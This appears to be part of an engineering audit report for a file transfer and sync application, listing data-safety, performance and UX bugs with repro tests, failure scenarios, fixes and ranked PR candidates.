- **Severity:** P1 · **Category:** bug / data-safety · **Status:** NEW · **Confidence:** VERIFIED (repro `park_repro_test.dart`, `dir_retry_repro_test.dart`)
- **Where:**
  - `transfer_queue.dart:2054-2073`: `_runDirectory` resolves the container via `_resolvedContainer`, and a *pending* container yields `null`, which skips the item.
  - `:4944-4949`: `_resolvedContainer` treats "not ready" as "skipped/failed".
  - `:2091-2111`: the disconnect retry re-chains at the tail, behind children already queued.
  - `:3421-3431`: a parked folder, or a waiter past the conflict cap, stays `pending`.
  - `:3462-3471`: resolving re-runs only the parent. Only `_retryItemInPlace` (`:4060-4078`) re-arms `containerSkips`.
- **Evidence:** repro output, with destination `/dst/src` existing and `folders: ask`:
  ```
  before answer: /src/child  skipped  the containing directory was skipped
                 /src/child/payload.txt skipped ...
  after merge:   /src completed, /src/top.txt completed, /src/child skipped, payload skipped
  ```
  The disconnect variant: parent `/src` completed after retry, child directory and file skipped, task `completed`, `skipped=2`, nothing under `/dst/src/child`.
- **Failure scenario:** a user re-uploads a site folder that already exists on the server. Default settings: `ConflictPolicy` defaults every bucket to `ask`, and `PaneDropDelegate` uses `ConflictPolicy()`. The folder prompt appears. Before the user answers, every subfolder is already skipped. The user picks Merge. Only top-level files upload and the task reads "completed". The skipped rows are not retryable: `canRetryItem` requires `failed`, and collateral is re-armed only through a *failed* container. For a same-server drag the default verb is move, so the tree ends up half-moved. The same happens after any transient disconnect during an upper `mkdir` in a large tree. The existing test (`transfer_conflict_test.dart:508`) covers only a flat folder.
- **Fix (shovel-ready):**
  1. Make directory ops wait on their container's `ready` gate the way files do (`_armFile`, `:2541-2552`). In `_scheduleDirectory`, if `planned.containerKey != null` and the container's outcome is `pending`, chain the op only after `container.ready.future` completes (read the *current* `ready` at completion time, because retry replaces it). Keep the chain serialization for the op itself.
  2. In `_runDirectory`'s `disconnected` branch, retry in place in a loop with a fresh lease, as `_runDeleteItem` already does (`:2404-2406`), instead of re-chaining at the tail.
  3. When a parked directory is resolved or invalidated, nothing else is needed, because children only ever run after `ready`.
  - Tests to write first:
    - a nested subfolder under an asked folder is transferred after Merge;
    - a disconnect on the parent's materialize stat does not skip an already-scheduled child (the repro above);
    - a cap-waiter folder (`maxPendingConflicts: 1`) keeps its subfolders.
- **Effort:** M

#### P2-02 — Mirror deletes the destination's real directory contents under a source-side symlink
- **Severity:** P1 · **Category:** data-safety · **Status:** NEW · **Confidence:** VERIFIED (repro `p2_symlink_repro_test.dart`)
- **Where:**
  - `poltergeist_sync/lib/src/diff.dart:41-52`: `excludedOn` covers only listing-failure subtrees (`_erroredSubtrees`, `:118`).
  - `:401-438`: `_oneSideItem` checks only whether *the entry itself* is a symlink.
  - `:460-478`: the matched symlink item skips only its own path.
- **Evidence:** left `{data: symlink}`, right `{data: dir, data/photo1.jpg, data/photo2.jpg}`, Mirror left→right yields `data/photo1.jpg deleteRight`, `data/photo2.jpg deleteRight`. 05 §3 (lines 284-291) says the symlink path is "excluded on both sides, exactly like a scan error … a Mirror run can never delete the real counterpart of a source-side symlink". The rsync exporter already excludes `/data` (anchored, whole subtree; `rsync_export.dart:99-122`), so the engine and the exported command disagree.
- **Failure scenario:** a developer's local `wp-content/uploads` is a symlink to a shared drive, while on the server it is a real directory of user uploads. A Mirror of local→server plans deletes for every uploaded file. Under 500 files and under 50% of the side, no typed confirmation is shown. With the default trash they are recoverable. With `deletions: permanent` they are gone.
- **Fix:** in `diffScans`, add each path whose entry on *either* side is `EntryKind.symlink` to the excluded-prefix set used by `excludedOn`, on both sides. Descendants then become `SyncReason.excluded` (or `scanError`) skip rows, never orphans. Also count them into the plan's `symlinksSkipped`. Test: the repro above, plus the mirror case (destination-side symlink with source directory children), which should yield skip rows instead of copy rows that fail `_checkParentChain` and gate the whole delete phase.
- **Effort:** S

#### P2-03 — typeDiffers directory replacement: destination-only descendants are not subsumed
- **Severity:** P1 · **Category:** data-safety · **Status:** NEW · **Confidence:** VERIFIED (repro `p2_repro_test.dart`, two cases)
- **Where:**
  - `diff.dart:263-297`: the normal matching loop emits every path, including descendants of a typeDiffers directory.
  - `:566-613`: `_typeDiffersItem` captures `destinationSubtree` but nothing removes those paths from the item set.
  - The contract is stated at `plan.dart:403-411` and 05 §6 rule 4 (lines 785-789: "the differ emits no separate items for paths that exist only under it").
- **Evidence:**
  - Mirror + `keepLeft`, left `p` a file, right `p/inner.txt`. The plan is `p copyLeftToRight typeDiffers` plus `p/inner.txt deleteRight`. `assessDeletions` counts `right: 2` for one file. After the run, `p/inner.txt` is `conflicted: changed since preview`, so every such run reports a conflict.
  - Mirror + `conflictDefault: ask` + `deletions: permanent`: `p` stays an unresolved conflict and is skipped, yet `p/precious.txt deleteRight` executes, and the file is permanently gone.
- **Failure scenario:** the user leaves or resolves a kind conflict as "skip, keep the destination folder", and the folder's contents are deleted anyway by separate rows. With the permanent policy this is unrecoverable. The double count can also spuriously trip `maxDelete` or the typed confirmation (safe direction, but wrong numbers).
- **Fix:**
  - In `_Differ.build`, before the normal matching loop, collect the typeDiffers pairs: matched paths where kinds differ and neither side is a symlink.
  - For each, add every path under `'$path/'` that exists **only on the directory side** to an `absorbed` set.
  - Skip those paths in the loop. The item's `destinationSubtree` already carries them for counting and verification.
  - When the source side is the directory (left `p/` vs right file `p`), the source-only children still need copy rows. Absorb only the destination-side directory's descendants.
  - Tests: the two repros, plus "resolved replace yields no conflicted rows" and "rail counts equal the subtree file count".
- **Effort:** S–M

#### P2-04 — Sync update with `backups: trash`: a failed transfer strands the destination and orphans the backup
- **Severity:** P1 · **Category:** data-safety · **Status:** NEW · **Confidence:** VERIFIED (repro)
- **Where:**
  - `executor.dart:890-906`: the destination is moved to trash first.
  - `:919-948`: `_transfer` runs afterwards.
  - `:760-787`: `_runItem` replaces the outcome with an empty `_ItemOutcome()` on any exception, so `trashLocation` never reaches the item line.
  - Contrast `_removeDestination` (`:1149-1161`), which journals a `SyncJournalTrashLine` right after each move.
- **Evidence:** repro with an upload failing as `disconnected`: `status=failed`, destination exists = **false**, journal item `trashLocation=null`, `trashLines=0`, `hasUnpurgedTrash=false`, `restoreTrashedFiles` restored `[]`.
- **Failure scenario:** a `Blog → webserver` update of `index.html` hits a dropped connection mid-upload. The live `index.html` is gone from the docroot. Undo cannot find the backup. Retry Failed re-verifies the destination, finds it absent, and flips to `conflicted`. The journal is prunable after 20 runs, and the backup then sits unmapped in the in-root trash forever (purge is unbuilt, open item 27). The same shape applies to any failure after the trash move: source changed (`_verifySource` runs before, but a download conflict mid-stream), disk full, or permission denied.
- **Fix:**
  1. Immediately after `_trashEntry` in the update branch, `await journal.appendTrash(SyncJournalTrashLine(parentPath: rel, relativePath: rel, …))` (restore already handles self-path trash lines), and drop `trashLocation` from the item line to avoid double restore.
  2. Wrap the transfer: on failure, if the destination is still absent, `rename(trashLocation → destAbs)` back and journal the rollback, for example by appending a `restored` marker or re-journaling. Report the item as failed with the destination intact.
  - Tests: the repro, asserting the destination still holds the old bytes, plus a variant where the rollback also fails, asserting `restoreTrashedFiles` restores it.
- **Effort:** S–M

#### P2-05 — Transfer journal compaction thrash (whole-journal rewrite and fsync per append)
- **Severity:** P1 · **Category:** performance / stability · **Status:** NEW · **Confidence:** VERIFIED (repro `compaction_thrash_test.dart`)
- **Where:**
  - `file_transfer_persistence.dart:485-487`: `_shouldCompact()` is true when `_journalBytes >= _compactBytes`.
  - `:495-520`: `_compact` rewrites all live-task records, then sets `_journalBytes` to their size.
  - Live records are never dropped, so after the first compaction the condition stays true, and the check runs inside every `appendJournal` (`:228-257`).
- **Evidence:** 2 000 planEntry appends for one live task with `compactBytes: 64 KiB` produced **1 828 full rewrites, 758 MB written**. The production threshold of 4 MiB is about 10k records, roughly 5k files (planEntry + fileCompleted, ~400 B each).
- **Failure scenario:** any upload or download of more than ~5k files, for example a `node_modules` folder or a photo library. Each further record builds a StringBuffer of 4 MiB or more plus `utf8.encode` **on the UI isolate** (the queue is built in `main.dart:301`), then writes it with `atomicRewrite` plus fsync plus a directory fsync. The writer chain backlog grows without bound: every pending closure retains its record. The "write-ahead" lag grows to minutes. `flush()` (the quit guard's exit durability point) and `shutdown()` wait for the whole backlog, so quit hangs. The UI janks and SSD wear is heavy. The memory model also retains every `(record, rawLine)` pair of live tasks in `_LiveTask.records` (`:815`).
- **Fix:** trigger compaction on reclaimable bytes, not total bytes. Track `_liveBytesAtLastCompact` and compact only when `_finishedSinceCompact >= N` or `(_journalBytes - _liveBytesAtLastCompact) >= _compactBytes` (bytes appended since the last compaction, which could contain superseded records), or simply `_journalBytes >= max(_compactBytes, 2 * _liveBytesAtLastCompact)`. Optionally drop superseded records inside live tasks: repeat planEntry upserts, and item records for items whose terminal record exists can collapse to one line each. Test: the repro with an expectation of at most a couple of rewrites, plus a property test that a replay of the compacted journal equals a replay of the uncompacted one.
- **Effort:** S

#### P2-06 — Within-task destination collisions resolved as ordinary conflicts (case/NFC twins, same-basename roots)
- **Severity:** P1 · **Category:** data-safety · **Status:** NEW (03 §4.2 requires "case-insensitive collision detection within the plan"; Séance's `remote_files_controller.dart:581-587` throws "Two remote items map to the same local path") · **Confidence:** VERIFIED for the decision flow (repro `queue_repro_test.dart`: the second twin commits with `overwrite:true` onto the first, and both sources are deleted by move). The real-FS result is inferred: `FakeTreeFileSystem.upload` adds a second key instead of replacing the folded occupant (`transfer_fakes.dart:386-456`), which is itself a test-fidelity gap.
- **Where:**
  - The walker (`recursive_walker.dart:177-191`) has no sibling-fold check.
  - `transfer_queue.dart:2670-2684`: the registry serializes, then `_decideFile` (`:3096`, `:3129-3140`) sees the twin as an occupant.
  - `:4978-4981`: `_fold` applies simple case fold but no Unicode normalization.
  - `:5101-5103`: remote destinations are never treated as case-insensitive, so Windows OpenSSH and macOS sshd servers are unprotected.
  - `_normalizeRoots` (`:5062`) dedupes roots but allows two roots with the same basename, as in an OS drop from Finder search results.
- **Failure scenario:** ⌘-drag (move) a Linux folder holding `README` and `readme` into a local macOS or Windows pane, or cross-server to a Windows server, with the `replace` policy or "Replace all". `README` commits and its source is deleted. `readme` then replaces it and its source is deleted. One file's content is permanently lost and both rows say completed. With copy the destination silently misses a file. With `ask` the user is prompted about a file this task itself just wrote. NFC/NFD twins onto APFS are not folded by the registry, so two concurrent in-flight twins can both pass the commit-time absent check; the second `rename(2)` clobbers without any conflict.
- **Fix:**
  - Track a per-task `Map<(endpoint, destKey), sourcePath>` of committed and in-flight destination keys. The key is `simpleCaseFold(nfc(path))` on a case- and normalization-insensitive destination, `nfc(path)` on APFS-style volumes, and the raw path otherwise.
  - When a file's key is already claimed by a *different source path in the same task*, never apply `replace`/`replaceIfNewer`. Fail the item with "two source items map to the same destination name on this volume", or offer keep-both only.
  - Detect twins at scan time per listing, since the closed-listing rule already exists, so both rows are flagged up front.
  - Add a per-server case/normalization probe (reuse `TreeScanner._resolveCaseSensitivity`) to feed `isCaseInsensitiveDestination`.
  - Fix the fake to replace folded occupants.
  - Tests: move + replace of case twins leaves both contents intact (one failed row); NFC/NFD twins serialize; same-basename roots.
- **Effort:** M

#### P2-07 — rsync exporter: filter patterns and remote paths escaped wrongly for remote pairs
- **Severity:** P1 · **Category:** security / data-safety (the pasted command diverges from the plan) · **Status:** NEW · **Confidence:** VERIFIED against rsync source (not executed)
- **Where:**
  - `rsync_export.dart:372-373`: `arg()` applies `_escapeRemotePath` to every flag value when any side is remote, including `--exclude`/`--include` (`:397-402`) and `--backup-dir` (`:391`).
  - `:506-509`: the remote spec is pre-escaped.
  - Tests pin the output: `rsync_export_test.dart:647-650` and `goldens/rsync/remote_plain.golden` (`--exclude='\*.poltergeist-\*' --exclude='.poltergeist\*'`).
- **Evidence (rsync source):**
  - Filter rules are sent over the rsync protocol, not on the remote command line: `server_options()` in `options.c` forwards no `--exclude`. They are never re-parsed by the remote shell.
  - `exclude.c:333`: `strpbrk(pattern,"*[?")` marks `.poltergeist\*` as wild, and `lib/wildmatch.c:86-89` treats `\*` as a literal `*`. So `.poltergeist\*` matches only a file literally named `.poltergeist*`.
  - A pattern without wildcards is compared with `strcmp`, so `/my\ trash/dir` never matches `my trash/dir`.
  - Since rsync 3.2.4, arg protection is the default. `safe_arg()` backslash-escapes backslashes and shell characters in filename args and option values, so a pre-escaped `host:/var/www/my\ site` reaches the remote as the literal `my\ site`. NEWS.md tells scripts that escape manually to use `--old-args` or `RSYNC_OLD_ARGS`.
  - In a pull, `--backup-dir` is used by the local receiver, so escaping it is always wrong there.
- **Failure scenario:** "Copy as rsync Command" for a Mirror pair local→server, pasted and run.
  1. The destination's `.poltergeist-trash/` (the engine's backups and Undo source) is not excluded, so rsync deletes it: moved into the new backup dir by default, removed permanently under `deletions: permanent, backups: none`. The engine's journals then point at nothing.
  2. A user exclude such as `Private Notes/` (with a space) does not match, so the folder is uploaded to the docroot, and under `--delete` destination-only excluded paths are deleted.
  3. On rsync ≥ 3.2.4, a root with a space syncs into a new wrongly named directory.
- **Fix:**
  - Never escape filter values; they need only the local single-quoting.
  - Escape `--backup-dir` only when the destination side is the remote one.
  - Prefix each emitted command line with `RSYNC_OLD_ARGS=2 `, so rsync ≥ 3.2.4 disables its own protection (`options.c:2089-2091`, `safe_arg` skips when `old_style_args >= 2`) while older rsync ignores the variable. The existing manual escape then stays correct for both.
  - Add a `# note:` explaining the prefix.
  - Update the goldens.
  - Ideally add a CI integration leg that runs the generated `rsync -n -i` against the sshd fixture with names containing spaces, `*`, and a `.poltergeist-trash` directory.
- **Effort:** S–M

#### P2-08 — Local commits are O(N²) per directory, and every file spawns `chmod`
- **Severity:** P2 · **Category:** performance · **Status:** NEW · **Confidence:** VERIFIED (measured, `replace_scaling_test.dart`)
- **Where:**
  - `local_fs_safety.dart:268-290`: `replaceLocalFile` calls `restoreOrphanedLocalBackups` (a full `directory.list`, `:403-427`) whenever the target is **absent**, which is the common new-file case. The comment only avoids the target-present case.
  - `local_file_system.dart:681-688` and `:859-866`: `Process.run('chmod', …)` runs per file whenever `preserveMode ?? existing.mode` is set. The queue always passes `file.source.mode` (`transfer_queue.dart:2805`, `:2826`).
- **Evidence (this Linux container):** new files into one directory cost 2.7 ms/file at 500, 3.1 at 1k, 4.3 at 2k and 5.7 at 4k, i.e. superlinear, about 1.7 µs per existing entry per commit. Adding `preserveMode: 0644` goes from 3.0 to 12.0 ms/file (+9 ms per chmod spawn). Extrapolated, 50k new files into one directory is about 37 min of listing overhead plus about 7 min of chmod.
- **Fix:**
  - Scope the orphan repair to a direct probe of the few possible backup names instead of a directory listing. Backups are `<target>.poltergeist-<8hex>.backup`, so either run the sweep once per directory per task (cache a `Set<dirPath>` in the queue or filesystem) or only at restore time.
  - Skip `chmod` when `FileStat.stat(temp).mode & 0xFFF == desired & 0xFFF`, or use an FFI `chmod` or `fchmod` on the open fd (FFI is already used for `copy_file_range`).
  - Test: a microbenchmark in `packages/poltergeist_core/benchmark/` plus a unit test asserting no directory listing happens per commit (count `list` calls through an injected seam).
- **Effort:** S

#### P2-09 — Retry after compaction orphans the task's journal (not restorable after a crash)
- **Severity:** P2 · **Category:** stability / data-safety · **Status:** NEW · **Confidence:** VERIFIED (repro `retry_compaction_repro_test.dart`, with `compactFinishedTasks: 1` to force compaction)
- **Where:**
  - `file_transfer_persistence.dart:495-520`: finished tasks migrate to history and leave the journal.
  - `:356-358`: `_applyToLive` uses `putIfAbsent`, which starts a spec-less live task.
  - `transfer_queue.dart:4167-4179`: `_requeueTask` journals only `taskState: queued`.
  - At open, spec-less tasks are dropped with the notice "taskEnqueued was lost".
- **Evidence:** the repro prints `restorable tasks: ()` and `notices=[journal held 1 records for tasks whose taskEnqueued was lost …]`.
- **Failure scenario:** a large transfer partly fails. Compaction runs, because 32 tasks finished or through the P2-05 byte trigger. The user clicks Retry and quits or crashes mid-retry. On relaunch the retried task is silently gone, and the "restored queue" promise is broken for exactly the task the user cared about. The task's history also gets two rows ("failed" then "completed"), because `appendHistory` does not dedupe by id.
- **Fix:** in `_requeueTask` and `_rescanRetry`, when persistence exists, re-append a full snapshot: `TaskEnqueuedRecord(spec)`, the planEntry records and the terminal outcomes. The simplest shape is a `persistence.readmit(task)` helper that the store no-ops when it still holds the task. Alternatively, never migrate tasks the queue still lists; the queue signals `removeTask`. Make `appendHistory` replace any earlier row for the same id. Test: the repro.
- **Effort:** S–M

#### P2-10 — Sync addresses both sides with one spelling, and NFC-folds normalization-sensitive sides
- **Severity:** P2 · **Category:** bug (non-convergence) · **Status:** NEW · **Confidence:** VERIFIED (code trace)
- **Where:**
  - `diff.dart:159`: `_matchKey` always applies `nfcKey`, even for two case-sensitive, normalization-sensitive Linux sides. 05 §3 lines 1393-1398 say a normalization-sensitive side is never folded.
  - `:472-542`: `_matchedItem` sets `relativePath: leftPath`.
  - `executor.dart:818-826`: `_abs(destSide, item.relativePath)` addresses the right side with the left spelling.
  - The single `SyncItem.relativePath` field is at `plan.dart:361-381`.
- **Failure scenario:** a macOS left side holds an NFD `café.txt` (HFS+-era name) and a Linux server holds NFC `café.txt`. The differ pairs them, an update stats `root/café(NFD)` on Linux, gets `notFound`, and flips to `conflicted: changed since preview` on every run. The reverse direction fails with "source vanished". With two Linux sides holding distinct NFC and NFD files, the NFD file never reaches the right and the plan claims equality. No deletion results (the executor's re-stats make it fail safe), but the pair never converges, and each conflicted item gates the Mirror delete phase (rail 7 counts it as a failure).
- **Fix:** carry `leftPath` and `rightPath` on `SyncItem` (nullable, defaulting to `relativePath`), use the side's own spelling in every executor address and journal line, and NFC-fold only for sides known to be normalization-insensitive (APFS/HFS+ local, or probed). Test: diff/executor with NFD-left/NFC-right on a sensitive right side, where an update lands on the right's own spelling; and Linux↔Linux distinct twins, which should yield two items.
- **Effort:** M

#### P2-11 — Restored delete tasks act on current paths without re-verifying identity
- **Severity:** P2 · **Category:** data-safety · **Status:** NEW · **Confidence:** VERIFIED (code trace)
- **Where:**
  - `transfer_queue.dart:4497-4551`: `_rebuildScannedDeletePlan` arms `_DeleteWork(entry: journaled source)`.
  - `:2454-2473`: `_executeDelete` permanent calls `fs.delete(entry)` with no stat.
  - A mid-scan restore re-walks the current tree (`:4359-4369`).
  - `_finishDeleteItem` journals *after* the unlink, and appends are fsynced only every 64 records or 250 ms, so a crash can leave already-deleted items pending.
- **Failure scenario:** the user confirms "Delete permanently" of `report.pdf` (plus a large tree). The app crashes within 250 ms of unlinking `report.pdf`. Days later the user has created a new `report.pdf` in the same place, launches, and clicks Resume on the restored banner. The restored task permanently deletes the new file, with no re-confirmation. A mid-scan restore likewise deletes everything now under the roots, not what the dialog counted.
- **Fix:** for restored delete items (or all delete items), `stat(followLinks:false)` before acting and require `type`, `size` and `modifiedAt` to match the journaled planEntry (`sourceType`, `sourceSize`, `sourceModifiedAt`); otherwise skip with "changed since the delete was confirmed". For a restored mid-scan permanent delete, re-confirm or refuse (trash is fine). Test: journal a delete task, replace the file with new content, restore, resume, and assert the file survives with a skipped row.
- **Effort:** S

#### P2-12 — D15 remote-trash opt-in never wired: remote deletes are always permanent
- **Severity:** P2 · **Category:** missing-feature · **Status:** NEW (not in STATUS open items) · **Confidence:** VERIFIED (code trace)
- **Where:** the `TransferQueue` constructor defaults `remoteTrashEnabled` to `_trashOptedOut` (`transfer_queue.dart:113`, `:166`). Production composition (`app/.../transfer_queue_session.dart:160-164`) never passes it. There is no bookmark or setting field (grep for `remoteTrashEnabled` in `app/`: none). The delete dialog's opt-in branch (`delete_confirm_dialog.dart:96`, `:215`) is dead code in production.
- **Failure scenario:** every remote delete is confirm-then-permanent. The per-server "move to `.poltergeist-trash/<runId>/`" that D15 promises is unreachable, so mistaken remote deletes have no undo.
- **Fix:**
  - Add a per-bookmark device-local `remoteTrash` flag, stored with the probe opt-outs.
  - Pass `remoteTrashEnabled: (id) => settings.remoteTrashFor(id)`.
  - Surface the flag in the bookmark editor.
  - Test the composition: an opted-in server's `prepareDelete` yields `effectiveDisposition: trash`.
- **Effort:** M

#### P2-13 — UI-isolate stalls in the queue and sync engine
- **Severity:** P2 · **Category:** performance · **Status:** NEW · **Confidence:** VERIFIED (code trace; the queue and `SyncExecutor` are built in the UI isolate: `main.dart:301`, `sync_plan_controller.dart:1284`)
- **Where and failure:**
  - `local_copy_pump.dart:42`, `:200`: `copy_file_range` runs synchronously in 16 MiB chunks. On HDD, NFS or SMB mounts a chunk takes 100 ms to 1 s or more, which freezes the UI during local copies. Run the pump in `Isolate.run`, or cap chunks at about 1 MiB.
  - `transfer_queue.dart:3645-3706`: `_removeMovedDirectories` × `_subtreeFullyCompleted` costs O(dirs × items) of `startsWith` at the end of a move. 20k dirs × 200k items is about 4×10⁹ operations. Compute completeness in one pass over items using the containerKey chain.
  - `:3991-4029`: `canRetryTask` calls `items.any(canRetryItem)`, and each call runs `_itemOf` (O(n)) and `_retryWork` (O(files)). `activity_rows.dart:433` calls it in `build`, which is O(n²) per rebuild of a failed task's row. Index `itemId → work`.
  - `:5062-5099`: `_normalizeRoots` is O(n²) for large selections and runs 2-3 times per delete. Sort, then check prefixes against the previous kept root.
  - `poltergeist_sync/lib/src/journal.dart:292-303`: `lastAttempt` scans all item lines per executed item, O(n²) per run. Keep a map.
  - `diff.dart`: `_matchKey` (pure-Dart `unorm.nfc`) is recomputed about 5 times per path, and `_groupBy(other, …)` again inside `_hazardMap`. Memoize.
- **Fix:** as listed per bullet; each is local. Tests: complexity guards (for example 50k synthetic items finishing under a time budget) in the bench package.
- **Effort:** M (S each)

#### P2-14 — Folder conflict prompt loops on Merge / Replace-if-newer when the occupant is not a directory
- **Severity:** P3 · **Category:** UX · **Status:** NEW · **Confidence:** VERIFIED (code trace)
- **Where:** `conflict_policy.dart:348-354` offers `merge` whenever the *source* is a directory. In `resolveTransferConflict`, `:256-261` makes merge against a non-directory yield `ConflictAsk`, and replaceIfNewer on a folder that is not newer does the same when the occupant is not a directory (`:231-241`). `_materializeDirectory` (`transfer_queue.dart:2179-2226`) then re-parks.
- **Failure scenario:** a folder `site` collides with a *file* or a symlink named `site` at the destination. The user picks Merge and the identical prompt reappears, indefinitely.
- **Fix:** include `merge` and `replaceIfNewer` in `availableVerbs` only when `existing.isDirectory`. For a symlink occupant, explain that it will not be followed. Test: `PendingConflict.availableVerbs` for dir→file and dir→symlink.
- **Effort:** S

#### P2-15 — Progress and ETA ignore skipped and failed bytes
- **Severity:** P3 · **Category:** UX · **Status:** NEW · **Confidence:** VERIFIED (code trace)
- **Where:** `_finishItem` (`transfer_queue.dart:3814-3839`) never credits a skipped, failed or cancelled item's size. `activity_rows.dart:322-324` computes `transferred/total`, and `activity_panel_controller.dart:159-162` computes the ETA over `total - transferred`.
- **Failure scenario:** a re-upload with "Replace if newer" where 95% of the files skip. The bar sits at about 5% and the ETA shows hours until the task suddenly completes.
- **Fix:** add `task.settledBytes` (skipped, failed and cancelled sizes) and use `total - settled` in both the fraction and the ETA. Include it in `TransferQueueProgressEvent`. Test: two files with one skipped yields a progress of 1.0 at completion.
- **Effort:** S

#### P2-16 — No engine-level guard against a destination inside a source root
- **Severity:** P3 · **Category:** stability · **Status:** KNOWN in part (`pane_drop.dart:220-231`: "Case-insensitive APFS volumes share the hazard") · **Confidence:** LIKELY (the fake-FS repro `nest_repro_test.dart` did not recurse; the recursion depends on the timing of mkdir against the listing)
- **Where:** `TransferQueue.enqueue` (`:383-464`) has no containment check. The app's `paneDropAllowed` (`pane_drop.dart:192-210`) compares lexically. A local symlinked destination is caught by `ensureSafeLocalDirectory` (verified in the repro); case aliases on macOS and remote symlink aliases are not.
- **Failure scenario:** copying `/Users/x/Proj` into `/Users/x/proj/sub` (a case alias), or on a server copying `/var/www/site` into `/home/u/www/site/backup` where `/home/u/www` points to `/var/www`. The BFS walk can list the freshly created copy and nest repeatedly until paths overflow, filling the disk.
- **Fix:** in `_runTask`, before scanning same-endpoint copy or move tasks, canonicalize `destinationDir` and each root (and fold them on case-insensitive endpoints), then fail the task if the destination is inside a root. Also have the walker skip the canonical destination subtree. Test: fake FS with a case alias.
- **Effort:** S

#### P2-17 — Boot restore connects to servers before Resume
- **Severity:** P3 · **Category:** UX / privacy · **Status:** NEW · **Confidence:** VERIFIED (code trace)
- **Where:** `restore()` (`transfer_queue.dart:4286-4303`) calls `_sweepRestoredTemps` without awaiting it. That leases a transfer channel to each restored task's destination server (`:4585-4594`) immediately at app launch, while the queue is force-paused.
- **Failure scenario:** after a crash with a restored remote task, launching the app opens SSH connections, and possibly credential or host-key prompts, for servers the user did not ask to contact yet. On large restored tasks the sweep lists every journaled destination directory over SFTP.
- **Fix:** defer the sweep until the task is first resumed (hook it into `resumeQueue`/`resumeTask`), or run it only for local destinations at boot. Test: restore with a remote task, then assert no `leaseTransferChannel` call happens before `resumeQueue`.
- **Effort:** S

#### P2-18 — Transfer journal torn-write glue and silent write-ahead degradation
- **Severity:** P3 · **Category:** robustness · **Status:** NEW · **Confidence:** LIKELY
- **Where:** `transfer_journal.dart:1185-1188`: `appendLine` writes `'$line\n'` with no leading `\n`. The sync journal deliberately prefixes one (`poltergeist_sync/lib/src/journal.dart:387-399`). `_enqueue` (`file_transfer_persistence.dart`) converts write failures into a notice while the queue proceeds.
- **Failure scenario:** the disk fills while downloading to the same volume as app-support. A partial `writeAsString` leaves bytes without a terminator, the next successful append glues onto them, and at next open the complete-but-unparseable line quarantines the file and drops every later record, other tasks' enqueues included. Separately, every failed append means the write-ahead guarantee silently lapsed for that record.
- **Fix:** prefix `\n` and skip empty lines at parse, as the sync journal does. Surface persistence write failures as a queue-level warning event (and consider pausing admission while the store is failing). Test: a scripted IO that writes a partial line and then throws; the next records must still replay.
- **Effort:** S

#### P2-19 — Symlink-swap TOCTOU on local source reads; source parent chain unchecked in sync
- **Severity:** P3 · **Category:** security hardening · **Status:** NEW · **Confidence:** SPECULATIVE (needs an attacker who can write in the source tree)
- **Where:**
  - `local_file_system.dart:547-569` (download: nofollow type check, then `FileStat.stat` and `openRead` follow the path).
  - `:787-805` (`copyLocalFile`).
  - `local_copy_pump.dart:174` (`open` without `O_NOFOLLOW`).
  - `executor.dart:833` (`_checkParentChain` runs on the destination side only).
  - The Séance SFTP adapter compares lstat to fstat, which closes this window remotely.
- **Failure scenario:** an item in a shared or writable source directory is swapped for a symlink to `~/.ssh/id_ed25519` between scan and read, and its content is uploaded to the destination, for example a public docroot.
- **Fix:** open with `O_NOFOLLOW`, or compare the pre-open lstat with the post-open stat (dev/ino/size/mtime) as the SFTP adapter does. Re-check the source parent chain in the sync executor too.
- **Effort:** S–M

### 3. Best PR candidates

1. **P2-01: child directory ops wait on their container's `ready`, and the disconnect retry happens in place.** Self-contained in `transfer_queue.dart` (`_scheduleDirectory`/`_runDirectory`, about 60 lines) plus three tests in `transfer_conflict_test.dart`/`transfer_queue_test.dart`. Write the failing tests first: (a) a folder `ask` with a nested `child/payload.txt` must land after a Merge answer (repro `park_repro_test.dart`); (b) a `disconnected` on the parent's materialize stat must not skip an already-scheduled child (repro `dir_retry_repro_test.dart`); (c) a folder parked past `maxPendingConflicts` keeps its subfolders. Then gate chaining on `container.ready` (re-reading the current completer, because retry swaps it), and loop the disconnect retry inside `_runDirectory` with a fresh lease. This affects the default configuration and gives the most value for the size.

2. **P2-02: exclude symlink subtrees on both sides in the differ.** About 20 lines in `diff.dart` (extend the `excludedOn` prefix set with symlink paths from either scan) plus the repro as a `diff_test.dart` case, and one executor-level case where a destination-side symlink over source children yields skip rows, not a gated run. Low risk: it only turns deletes and copies into skips, and it matches both 05 §3 and the rsync exporter's existing behavior.

3. **P2-05: compaction trigger on reclaimable bytes.** A one-function change in `file_transfer_persistence.dart` (`_shouldCompact` plus a `_liveBytesAtLastCompact` field). Regression test first: `compaction_thrash_test.dart` (a `CountingIo` subclass of `TransferJournalIo` counts `atomicRewrite`; with `compactBytes: 64 KiB` and 2 000 appends to one live task, expect ≤ 2 rewrites), plus the existing persistence suite for compaction behavior when tasks finish. Removes the UI-isolate thrash, the quit hang and the SSD churn for any transfer of more than ~5k files.

4. **P2-04: journal the update backup immediately and roll back on transfer failure.** About 40 lines in `executor.dart` (update branch) plus two tests. First test: `p2_repro_test.dart`'s "update with backups:trash and a failed upload" (upload scripted to throw `disconnected`), asserting that the destination keeps the old bytes and the journal carries a trash line or rollback record. Second test: rollback rename also failing, then `restoreTrashedFiles` restores it. Keeps rail 9's Undo whole.

5. **P2-03: subsume a replaced directory's destination-only descendants.** About 40 lines in `_Differ.build`. Tests first: (a) Mirror + ask + permanent with an unresolved `p` typeDiffers must leave `p/precious.txt` intact; (b) Mirror + keepLeft replace yields no `conflicted` rows and the rail count equals the subtree's file count. Contained in `diff.dart`; the executor already handles the subtree.

6. **P2-07: rsync exporter escaping.** Stop escaping filter values, escape `--backup-dir` only for a remote destination, and add the `RSYNC_OLD_ARGS=2 ` prefix and a note. Update `rsync_export_test.dart` expectations (`:647-650`) and the remote goldens. Write the updated expectations first: `--exclude='.poltergeist*'` unescaped in `remote_plain.golden`, `--exclude='/my trash/dir'`, and the prefix present only when a remote side exists. Pure text generation, so low regression risk.

### 4. Ideas

- **Plan-time collision lens for transfers (Séance parity, extends P2-06).** When a destination is case- or normalization-insensitive, the scan groups each closed listing by fold key and flags twins as a single "2 items map to one name" row with per-twin choices (rename one on arrival as `name (case 2)`, skip one). First slice: detection plus a failed row naming both sources, without the rename UX.
- **Per-server filesystem traits, probed once and cached.** Record case sensitivity, normalization sensitivity, setstat support and posix-rename availability per server (reuse the sync scanner's write probe and its `.poltergeist-caseprobe` exclusion). This feeds the queue's registry fold, P2-06's twin detection, the sync scan and the rsync exporter's notes. First slice: case sensitivity for the queue.
